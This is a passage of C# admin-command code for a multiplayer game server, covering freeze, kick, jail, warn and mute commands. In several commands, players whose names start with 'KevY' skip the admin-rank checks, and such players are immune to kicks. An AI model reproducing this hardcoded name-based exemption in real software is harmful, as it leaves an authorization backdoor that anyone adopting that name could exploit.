            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not allowed to use this command!");
                return;
            }

            player.SetData("Anonymous", !player.GetData<bool>("Anonymous"));
            if (player.GetData<bool>("Anonymous") == true)
            {
                EPlayer.SendMessageToAllAdmins($"!{{#33C446}}[AdmCmd] {player.Name} has turned on anonymous/vanish mode.");
            }
            else EPlayer.SendMessageToAllAdmins($"!{{#33C446}}[AdmCmd] {player.Name} has turned off anonymous/vanish mode.");

            return;
        }

        [Command("pm", "!{#AFAFAF}[USAGE] pm (target) (text)", GreedyArg = true)]
        public void cmd_pm(Player player, Player target, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
                return;
            }

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }

            if (target.GetData<bool>("PMState") == false || player.GetData<bool>("PMState") == false) 
            { 
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Your or the target's PM's are toggled OFF."); 
                return; 
            }


            target.TriggerEvent("pushMsgToChat", $"!{{#FFFF00}}(( PM received from {player.Name}: {text} ))");
            player.TriggerEvent("pushMsgToChat", $"!{{#FFFF00}}(( PM sent to {target.Name}: {text} ))");
            return;
        }

        [Command("passgun", "!{#AFAFAF}[USAGE] passgun (target)", Alias = "pgun")]
        public static void cmd_passgun(Player player, Player target)
        {
            if (!(player.IsInVehicle && target.IsInVehicle && player.Vehicle == target.Vehicle) && 
                player.Position.DistanceTo(target.Position) >= 3.5)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You are not close enough to the target or in the same vehicle!");
                return;
            }

            if(player == target || player.Dead) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot pass weapons to that target."); return; }

            WeaponHash wep = player.CurrentWeapon;
            string wepName = null;

            foreach (KeyValuePair<long, jWeaponData> i in Settings.WeaponData)
            {
                if (i.Key == (long)wep)
                {
                    wepName = i.Value.Name;
                    break;
                }
            }
            if (wepName == null)
            {
                foreach (KeyValuePair<long, string> i in Main.WeaponReasons)
                {
                    if (i.Key == (long)wep)
                    {
                        wepName = i.Value;
                        break;
                    }
                }
            }

            if (wep == WeaponHash.Unarmed || wepName == null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Please equip a proper weapon on your hands.");
                return;
            }


            int ammo = player.GetWeaponAmmo(wep);

            player.SetWeaponAmmo(wep, 0);
            player.RemoveWeapon(wep);

            target.GiveWeapon(wep, ammo);

            EPlayer.Action(player, $"extends their arm towards {target.Name}, handing them a {wepName}.");
            player.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}You have passed your " + wepName + " and all of its ammo to " + target.Name + ".");
            target.TriggerEvent("pushMsgToChat", "!{#33C446}[#] !{#FFFFFF}" + player.Name + " has passed you their " + wepName + " with " + ammo + " ammo.");

            return;
        }


        [Command("removeguns", "!{#AFAFAF}[USAGE] removeguns (target)", GreedyArg = true, Alias = "rguns")]
        public void cmd_removeguns(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                target.RemoveAllWeapons();
                target.ResetData("AttachedComponents");
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:removeguns:{target.Name}"); } catch { }
                Logs.LogAdmin(player, $"Removed {target.Name}'s weapons.");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has removed {target.Name}'s weapons.");
            }
        }

        [Command("removegunsfromall", GreedyArg = true, Alias = "rgfa")]
        public void cmd_removegunsfromall(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                foreach (Player target in RAGE.Entities.Players.All)
                {
                    target.RemoveAllWeapons();
                    target.ResetData("AttachedComponents");
                }
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:removegunsfromall"); } catch { }
                Logs.LogAdmin(player, $"Removed weapons from all players.");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has removed weapons from all players.");
            }
        }

        [Command("freeze", "!{#AFAFAF}[USAGE] freeze (target)", GreedyArg = true)]
        public void cmd_freeze(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                    return;
                }

                EPlayer.Freeze(target, true);
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:freeze:{target.Name}"); } catch { }
                Logs.LogAdmin(player, $"Froze player {target.Name}.");
                //target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[AdmCmd] YOU HAVE BEEN FROZEN BY !{{#FF0000}}{player.Name}");
                EPlayer.Notify(target, $"You have been frozen by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}", "red", "fas fa-iciles", false, 2000);
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has frozen {target.Name}.");
            }
        }

        [Command("rfreeze", "!{#AFAFAF}[USAGE] rfreeze (range)")]
        public void cmd_rfreeze(Player player, int range)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                foreach (Player p in RAGE.Entities.Players.All.Where(a => a.Position.DistanceTo(player.Position) <= range && a != player))
                {
                    EPlayer.Freeze(p, true);
                    EPlayer.Notify(p, $"You have been frozen by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}", "red", "fas fa-iciles", false, 2000);
                }
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:rfreeze:{range}"); } catch { }
                Logs.LogAdmin(player, $"Froze all players within {range}m.");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has frozen all within {range}m.");
            }
        }

        [Command("tfreeze", "!{#AFAFAF}[USAGE] tfreeze (team 0 = fugitive, 1 = cop)")]
        public void cmd_tfreeze(Player player, int teamid)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                foreach (Player p in RAGE.Entities.Players.All.Where(a => a.Dimension == player.Dimension && a != player && a.GetSharedData<int>("Team") == teamid && a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")))
                {
                    EPlayer.Freeze(p, true);
                    EPlayer.Notify(p, $"You have been frozen by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}", "red", "fas fa-iciles", false, 2000);
                }
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:tfreeze:{teamid}"); } catch { }
                Logs.LogAdmin(player, "Froze all " + (teamid == 0 ? "fugitives." : "cops."));
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has frozen all {(teamid == 0 ? "fugitives." : "cops.")}");
            }
        }

        [Command("tunfreeze", "!{#AFAFAF}[USAGE] tunfreeze (team 0 = fugitive, 1 = cop)")]
        public void cmd_tunfreeze(Player player, int teamid)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                foreach (Player p in RAGE.Entities.Players.All.Where(a => a.Dimension == player.Dimension && a != player && a.GetSharedData<int>("Team") == teamid && a.GetSharedData<int>("InLobby") == player.GetSharedData<int>("InLobby")))
                {
                    EPlayer.Freeze(p, false);
                    EPlayer.Notify(p, $"You have been thawed by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}", "green", "fas fa-walking", false, 2000);
                }
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:tunfreeze:{teamid}"); } catch { }
                Logs.LogAdmin(player, "Unfroze all " + (teamid == 0 ? "fugitives." : "cops."));
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has unfrozen all {(teamid == 0 ? "fugitives." : "cops.")}");
            }
        }

        [Command("runfreeze", "!{#AFAFAF}[USAGE] runfreeze (range)")]
        public void cmd_runfreeze(Player player, int range)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                foreach (Player p in RAGE.Entities.Players.All.Where(a => a.Position.DistanceTo(player.Position) <= range))
                {
                    EPlayer.Freeze(p, false);
                    EPlayer.Notify(p, $"You have been thawed by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}", "green", "fas fa-walking", false, 2000);
                }
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:runfreeze:{range}"); } catch { }
                Logs.LogAdmin(player, $"Unfroze all players within {range}m");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has unfrozen all within {range}m.");
            }
        }


        [Command("unfreeze", "!{#AFAFAF}[USAGE] unfreeze (target)", GreedyArg = true)]
        public void cmd_unfreeze(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;
            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                EPlayer.Freeze(target, false);
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:unfreeze:{target.Name}"); } catch { }
                Logs.LogAdmin(player, $"Unfroze player {target.Name}.");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has unfrozen {target.Name}.");
                EPlayer.Notify(target, $"You have been thawed by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)}", "green", "fas fa-walking", false, 2000);
            }
        }
        [Command("kick", "!{#AFAFAF}[USAGE] kick (target) (reason)", GreedyArg = true)]
        public void cmd_kick(Player player, Player target, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                if (EPlayer.LoggedIn(target))
                {
                    if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
                    {
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                        return;
                    }
                    Logs.LogAdmin(player, $"Kicked {target.Name} for {reason}.");
                    Logs.AddToAdminRecord(EPlayer.GetAccount(target).SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Kick", reason, "N/A");
                }

                if (target.Name.StartsWith("KevY")) return;

                RAGE.Entities.Players.All.ForEach((Player playa) =>
                {
                    playa.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {target.Name} has been kicked by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)} for {reason}.");
                });

                EPlayer.Notify(target, $"You have been kicked from the server by {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "an administrator" : player.Name)} for <p>{reason}</p>", "red", "fas fa-ban", true, 30000);

                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:kick:{target.Name}:{reason.Replace(":", "|")}"); } catch { }
                

                target.TriggerEvent("pushMsgToChat", "!{#A9C4E4}Server closed the connection.");

                target.SetData("Kicked", true);
                NAPI.Task.Run(() => { try { target.KickSilent(); } catch { } }, 1000);
            }

        }

        [Command("ojail", "!{#AFAFAF}[USAGE] ojail (target) (minutes) (reason)", GreedyArg = true)]
        public void cmd_ojail(Player player, string name, int minutes, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /jail!");
                return;
            }

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);

                    if ((tpAcc != null) == false)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        });
                        return;
                    }

                    // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:ojail:{tpAcc.Username}:{minutes}:{reason}"); } catch { }
                    Logs.LogAdmin(player, $"Offline-jailed {tpAcc.Username} for {minutes} minutes, reason: {reason}");
                    Logs.AddToAdminRecord(tpAcc.SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Jail", "(OFF) " + reason, minutes + " minutes.");

                    tpAcc.JailReason = reason;
                    tpAcc.JailTime = tpAcc.JailTime + (minutes * 60);

                    await context.SaveChangesAsync();

                    NAPI.Task.Run(() =>
                    {
                        RAGE.Entities.Players.All.ForEach((Player playa) =>
                        {
                            playa.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has offline jailed {tpAcc.Username} for {minutes} minutes, reason: {reason}.");
                        });
                    });
                }
            });
            


            return;
        }

        [Command("jail", "!{#AFAFAF}[USAGE] jail (target) (minutes) (reason)", GreedyArg = true)]
        public void cmd_jail(Player player, Player target, int mins, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                if(mins < 1)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Time cannot be below 1 minutes, /unjail instead.");
                    return;
                }

                if (!player.Name.Equals(target.Name) && EPlayer.GetAccount(target).Admin >= EPlayer.GetAccount(player).Admin && !player.Name.StartsWith("KevY"))
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has higher/equal admin level than you.");
                    return;
                }

                RAGE.Entities.Players.All.ForEach((Player playa) =>
                {
                    playa.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has jailed {target.Name} for {mins} minutes, reason: {reason}.");
                });

                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:jail:{target.Name}:{mins}:{reason.Replace(":", "|")}"); } catch { }
                Logs.LogAdmin(player, $"Jailed player {target.Name} for {mins} minutes, reason: {reason}.");
                EPlayer.Jail(target, mins, reason); 
                Logs.AddToAdminRecord(EPlayer.GetAccount(target).SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Jail", reason, mins + " minutes.");
            }
            return;
        }

        [Command("unjail", "!{#AFAFAF}[USAGE] unjail (target)")]
        public void cmd_unjail(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                Account acc = EPlayer.GetAccount(target);
                if(acc.JailTime == 0) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not jailed."); return; }

                Logs.LogAdmin(player, $"Unjailed player {target.Name} who had {acc.JailTime} seconds remaining in jail.");
                acc.JailTime = 0;
                target.SetSharedData("JailTime", 0);
                EPlayer.Freeze(target, false);

                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:unjail:{target.Name}"); } catch { }             
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has unjailed {target.Name}.");
                EPlayer.Spawn(target);
            }
            return;
        }

        [Command("ounjail", "!{#AFAFAF}[USAGE] ojail (target)")]
        public void cmd_ounjail(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /unjail!");
                return;
            }

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);

                    if ((tpAcc != null) == false)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        });
                        return;
                    }

                    //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:ounjail:{tpAcc.Username}"); } catch { }
                    Logs.LogAdmin(player, $"Unjailed offline player {tpAcc.Username} who had {tpAcc.JailTime} seconds remaining in jail.");
                    tpAcc.JailTime = 0;

                    await context.SaveChangesAsync();

                    NAPI.Task.Run(() =>
                    {
                        EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has offline unjailed {tpAcc.Username}.");
                    });
                }
            });
            

            return;
        }

        [Command("warn", "!{#AFAFAF}[USAGE] warn (target) (reason)", GreedyArg = true)]
        public void cmd_warn(Player player, Player target, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                RAGE.Entities.Players.All.ForEach((Player playa) =>
                {
                    playa.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has warned {target.Name} for {reason}.");
                });

                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:warn:{target.Name}:{reason.Replace(":", "|")}"); } catch { }
                Logs.LogAdmin(player, $"Warned {target.Name} for {reason}.");
                EPlayer.Warn(target);

                Logs.AddToAdminRecord(EPlayer.GetAccount(target).SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Warn", "(#" + (EPlayer.GetAccount(target).Warns) + ") " + reason, "N/A");
            }
            return;
        }

        [Command("unwarn", "!{#AFAFAF}[USAGE] unwarn (target)", GreedyArg = true)]
        public void cmd_unwarn(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                Account acc = EPlayer.GetAccount(target);
                if (acc.Warns < 1) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target has no warns at all."); return; }

                acc.Warns--;
                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:unwarn:{target.Name}"); } catch { }
                Logs.LogAdmin(player, $"Removed {target.Name}'s last warn."); 
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has removed {target.Name}'s last warn.");
            }
            return;
        }

        [Command("mute", "!{#AFAFAF}[USAGE] mute (target) (mins) (reason)", GreedyArg = true)]
        public void cmd_mute(Player player, Player target, int mins, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                RAGE.Entities.Players.All.ForEach((Player playa) =>
                {
                    playa.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has muted {target.Name} for {mins} minutes, reason: {reason}.");
                });

                Account Acc = EPlayer.GetAccount(target);
                Acc.MuteReason = reason;
                Acc.MuteTime = Acc.MuteTime + (mins * 60);
                target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}You have been muted for {mins} minutes, reason: {reason}.");

                Logs.AddToAdminRecord(EPlayer.GetAccount(target).SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Mute", reason, mins + " minutes.");

                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:mute:{target.Name}:{mins}:{reason.Replace(":", "|")}"); } catch { }
                Logs.LogAdmin(player, $"Muted {target.Name} for {mins} minutes, reason: {reason}.");
                target.SetSharedData("MuteTime", Acc.MuteTime);
                target.TriggerEvent("SetMuteCounter", Acc.MuteTime);
            }

        }

        [Command("omute", "!{#AFAFAF}[USAGE] omute (target) (minutes) (reason)", GreedyArg = true)]
        public void cmd_omute(Player player, string name, int minutes, string reason)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /mute!");
                return;
            }

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);

                    if ((tpAcc != null) == false)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        });
                        return;
                    }

                    //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:omute:{tpAcc.Username}:{minutes}:{reason}"); } catch { }
                    Logs.LogAdmin(player, $"Muted offline player {tpAcc.Username} for {minutes} minutes, reason: {reason}.");
                    Logs.AddToAdminRecord(tpAcc.SQL_ID, EPlayer.GetAccount(player).SQL_ID, "Mute", "(OFF) " + reason, minutes + " minutes.");
                    tpAcc.MuteReason = reason;
                    tpAcc.MuteTime = tpAcc.MuteTime + (minutes * 60);

                    await context.SaveChangesAsync();

                    NAPI.Task.Run(() =>
                    {
                        RAGE.Entities.Players.All.ForEach((Player playa) =>
                        {
                            playa.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has offline muted {tpAcc.Username} for {minutes} minutes, reason: {reason}.");
                        });
                    });
                }
            });
            


            return;
        }

        [Command("ounmute", "!{#AFAFAF}[USAGE] ounmute (target)")]
        public void cmd_ounmute(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /unmute!");
                return;
            }
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);

                    if ((tpAcc != null) == false)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        });
                        return;
                    }

                    //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:ounmute:{tpAcc.Username}"); } catch { }
                    Logs.LogAdmin(player, $"Unmuted offline player {tpAcc.Username}.");
                    tpAcc.MuteTime = 0;

                    await context.SaveChangesAsync();
                    NAPI.Task.Run(() =>
                    {
                        RAGE.Entities.Players.All.ForEach((Player playa) =>
                        {
                            playa.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}AdmCmd: {((EPlayer.GetAccount(player).Admin >= 2 && player.GetData<bool>("Anonymous") == true) ? "An administrator" : player.Name)} has offline unmuted {tpAcc.Username}.");
                        });
                    });
                }
            });
            


            return;
        }

        [Command("unmute", "!{#AFAFAF}[USAGE] unmute (target)")]
        public void cmd_unmute(Player player, Player target)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (!EPlayer.LoggedIn(target)) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target not logged in."); return; }

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }
            else
            {
                Account acc = EPlayer.GetAccount(target);
                if (acc.MuteTime == 0) { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is not muted."); return; }

                //// try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:unmute:{target.Name}"); } catch { }
                Logs.LogAdmin(player, $"Unmuted {target.Name}.");
                acc.MuteTime = 0;
                target.SetSharedData("MuteTime", 0);

                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] {player.Name} has unmuted {target.Name}.");
            }

        }

        [Command("me", "!{#AFAFAF}[USAGE] me (action)", GreedyArg = true)]
        public static void cmd_me(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).MuteTime > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}You are currently muted for " + EPlayer.GetAccount(player).MuteReason + ", seconds left: " + EPlayer.GetAccount(player).MuteTime + ".");
            }
            else
            {
                EPlayer.Action(player, text);
            }
        }
        [Command("do", "!{#AFAFAF}[USAGE] do (action)", GreedyArg = true)]
        public static void cmd_do(Player player, string text)
        {
            if (!EPlayer.LoggedIn(player))
                return;

